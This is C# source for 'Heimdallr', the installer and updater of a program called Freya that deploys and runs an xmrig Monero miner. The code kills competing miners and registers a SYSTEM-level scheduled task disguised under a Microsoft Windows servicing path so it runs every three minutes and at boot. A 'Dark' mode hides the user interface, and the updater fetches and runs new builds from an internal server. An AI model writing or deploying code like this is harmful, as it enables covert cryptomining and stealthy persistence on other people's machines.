using Freya;
using FSLib.App.SimpleUpdater;
using FSLib.App.SimpleUpdater.Defination;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ServiceProcess;
using System.Diagnostics;
using Freya.Service;
using System.Reflection;
using Microsoft.Win32.TaskScheduler;
using Microsoft.Win32;

namespace Heimdallr
{
    class Program
    {
        static void Main(string[] args)
        {
            //訂閱載入內崁DLL資源
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;

            if (args != null && args.Length > 0)
            {
                // 確保只有一個執行
                FFunc.SingleInstance();

                switch (args[0].ToString())
                {
                    case "update":
                        RunUpdater();
                        break;
                    case "install":
                        InstallFreya(false); // Install Task, Install and start service.
                        break;
                    case "uninstall":
                        StopService();
                        UninstallService();
                        break;
                    case "installTask":
                        InstallTask(); // Install Task.
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[Heimdallr] Command not recognized.");
                        break;
                }
            }
            else
            {
                InstallFreya(true); // Install, start service, start UI
            }
            Console.ResetColor();
            //Console.ReadLine(); // For debug only, remove when production
        }

        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            string resourceName = "Heimdallr." + new AssemblyName(args.Name).Name + ".dll";
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                byte[] assemblyData = new byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        }

        private static void RunUpdater()
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("Heimdallr is Starting Updater");

            var freyaUpdater = Updater.CreateUpdaterInstance(
            new UpdateServerInfo[]
            {
                    new UpdateServerInfo("http://10.57.208.65/freya/{0}", "update_c.xml"),
                    new UpdateServerInfo("http://你的服务器地址2/路径/{0}", "update_c.xml")
                //...其它服务器地址
            });

            freyaUpdater.Context.EnableEmbedDialog = false; // 禁用內建dialog
            freyaUpdater.Context.ForceUpdate = false;  //設定false才會進入 UpdatesFound event，打包時，"不提示直接自動啟動升級"不可勾
            freyaUpdater.Context.AutoKillProcesses = true;
            //freyaUpdater.Context.HiddenUI = true;

            freyaUpdater.Error += (s, e) =>
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[Heimdallr] Update Error：" + freyaUpdater.Context.Exception.Message);
                Console.WriteLine(freyaUpdater.Context.UpdateInfoTextContent);
                Console.ResetColor();
                Environment.Exit(0);
            };
            freyaUpdater.NoUpdatesFound += (s, e) =>
            {
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("[Heimdallr]Server Version：" + freyaUpdater.Context.UpdateInfo.AppVersion);
                Console.WriteLine("[Heimdallr]Local Version：" + freyaUpdater.Context.CurrentVersion);
                Console.WriteLine("[Heimdallr] No New Version!");
                Console.ResetColor();
                Environment.Exit(0);
            };
            freyaUpdater.MinmumVersionRequired += (s, e) =>
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[Heimdallr]Current Version is too low for update!");
                Console.ResetColor();
                Environment.Exit(0);
            };

            freyaUpdater.UpdatesFound += new EventHandler(updater_UpdatesFound);

            freyaUpdater.BeginCheckUpdateInProcess();
            Console.ResetColor();
            Console.ReadLine(); //必須保留，不加updater還來不及跑就結束了，在訂閱事件裡面加上 Environment.Exit(0);作結束
        }

        private static void updater_UpdatesFound(object sender, EventArgs e)
        {
            var freyaUpdater = Updater.Instance;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[Heimdallr] New Version Found：" + freyaUpdater.Context.UpdateInfo.AppVersion);
            Console.ResetColor();
            // Stop and Uninstall Service
            StopService();
            UninstallService();

            // Kill FreyaUI / Miner
            try
            {
                Process[] procs = Process.GetProcesses();
                foreach (Process p in procs)
                {
                    if (p.ProcessName == "xmrig" || p.ProcessName == "Freya" || p.ProcessName == "Freya.Service" || p.ProcessName == FConstants.MinerFileName)
                        p.Kill();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[Heimdallr] Kill Process Exception:" + ex.Message);
                Console.ResetColor();
            }
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("[Heimdallr] FreyaUI process killed.");

            Console.WriteLine("[Heimdallr] Starting update");
            Console.WriteLine("[Heimdallr] Check Service exist:" + ServiceExists(FConstants.ServiceName).ToString());
            freyaUpdater.StartExternalUpdater();
            Console.ResetColor();
        }
        private static void InstallFreya(bool startUI = false)
        {
            ///
            /// [Clean up old miners before installation]
            Process[] procs = Process.GetProcesses();
            foreach (Process p in procs)
            {
                if (p.ProcessName == "xmrig" || p.ProcessName == "xmr-stak" || p.ProcessName == "WindowsServiceAgent" || p.ProcessName == FConstants.MinerFileName)
                {
                    Console.WriteLine("   Kill Process: " + p.ProcessName);
                    p.Kill();
                }
            }
            DeleteFile(@"C:\Windows\SysWOW64\windowsserviceagent.exe");
            DeleteFile(@"C:\Windows\windowsserviceagent.exe");
            DeleteFile(@"C:\Intel\windowsserviceagent.exe");

            FFunc.SetRegKey("FeatureByte", Convert.ToInt32(FConstants.FeatureByte.Dark));

            ///
            /// [開機自動啟動 FreyaUI]
            try
            {   //Dark Mode不自動啟動FreyaUI，刪除registry key
                if (FFunc.HasRight(FConstants.FeatureByte.Dark))
                {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    if (key != null)
                        key.DeleteValue("FreyaUI");
                    Console.WriteLine("[Heimdallr] Registry key deleted");
                }
                else
                {
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "FreyaUI", System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "FreyaUI.exe");
                    Console.WriteLine("[Heimdallr] Registry key added");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[Heimdallr] Adding registry Exception: " + ex.Message.ToString());
                Console.ResetColor();
            }


            InstallTask();
            InstallService();
            StartService();

            //// Todo: Start FreyaUI
            if (startUI && !FFunc.HasRight(FConstants.FeatureByte.Dark))
            {
                //start freya UI.
            }
        }

        private static void InstallTask()
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[Heimdallr] Check Task...");
                using (TaskService ts = new TaskService())
                {
                    const string taskName = @"\Microsoft\Windows\Servicing\ServiceAssistantCheck";
                    Task t = ts.GetTask(taskName);
                    if (t == null)
                    {
                        Console.WriteLine("[Heimdallr] Task not found, create new...");
                    }
                    else
                    {
                        Console.WriteLine("[Heimdallr] Task found, rewrite new settings...");
                        ts.RootFolder.DeleteTask(taskName);
                    }

                    // Create a new task definition and assign properties
                    TaskDefinition td = ts.NewTask();

                    td.RegistrationInfo.Description = "Check service status change.";
                    //td.Principal.LogonType = TaskLogonType.ServiceAccount;
                    td.Principal.RunLevel = TaskRunLevel.Highest;
                    td.Settings.MultipleInstances = TaskInstancesPolicy.IgnoreNew;
                    td.Settings.StartWhenAvailable = true;
                    td.Settings.WakeToRun = true;
                    td.Settings.RestartCount = 5;
                    td.Settings.RestartInterval = TimeSpan.FromSeconds(100);

                    // Add a trigger that will fire every 60 minutes
                    TimeTrigger tt = td.Triggers.Add(new TimeTrigger());
                    tt.Repetition.Interval = TimeSpan.FromMinutes(3);

                    // Create trigger that fires 5 minutes after the system starts.
                    BootTrigger bt = td.Triggers.Add(new BootTrigger());
                    bt.Delay = TimeSpan.FromMinutes(5);

                    // Add an action that will launch Notepad whenever the trigger fires
                    td.Actions.Add(new ExecAction(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, "update", null));

                    // Register the task in the root folder
                    ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("[Heimdallr] Task Scheduler ... Done.");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[Heimdallr] Task scheduler operation exception: " + ex.ToString());
            }
            Console.ResetColor();
        }


        private static void InstallService()
        {
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            if (!ServiceExists(FConstants.ServiceName))
            {
                Console.WriteLine("[Heimdallr] Installing Service...");
                ProxyServiceInstaller installer = new ProxyServiceInstaller();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                installer.Install(false, new string[] { });
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine("[Heimdallr] Installing Service...done");
            }
            else
                Console.WriteLine("[Heimdallr] Service already exist!");
            Console.ResetColor();
        }

        private static bool ServiceExists(string serviceName)
        {
            ServiceController[] services = ServiceController.GetServices();
            return services.FirstOrDefault(s => s.ServiceName == serviceName) != null;
        }

        private static void StartService(string serviceName = FConstants.ServiceName)
        {
            if (ServiceExists(serviceName))
            {
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine("[Heimdallr] Starting Service...");
                ServiceController serviceContoller = new ServiceController(serviceName);
                if (serviceContoller.Status != ServiceControllerStatus.Running && serviceContoller.Status != ServiceControllerStatus.StartPending)
                    serviceContoller.Start();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine("[Heimdallr] Starting Service...done");
                Console.ResetColor();
            }
        }

        private static void StopService(string serviceName = FConstants.ServiceName)
        {
            if (ServiceExists(serviceName))
            {
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine("[Heimdallr] Stopping Service...");
                ServiceController serviceContoller = new ServiceController(serviceName);
                if (serviceContoller.Status != ServiceControllerStatus.Stopped && serviceContoller.Status != ServiceControllerStatus.StopPending)
                    serviceContoller.Stop();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine("[Heimdallr] Stopping Service...done");
                Console.ResetColor();
            }
        }

        private static void UninstallService()
        {
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            if (ServiceExists(FConstants.ServiceName))
            {
                Console.WriteLine("[Heimdallr] UnInstalling Service...");
                Console.ForegroundColor = ConsoleColor.DarkGray;
                ProxyServiceInstaller installer = new ProxyServiceInstaller();
                installer.Install(true, new string[] { });
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine("[Heimdallr] UnInstalling Service...done");
            }
            else
                Console.WriteLine("[Heimdallr] Service not exist!");
            Console.ResetColor();
        }

        private static void DeleteFile(string f)
        {
            try
            {
                if (System.IO.File.Exists(f))
                    System.IO.File.Delete(f);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[Heimdallr] Clean up miner exception. Error Deleting " + f + "\n" + ex.Message.ToString());
                Console.ResetColor();
            }
        }

    }
}
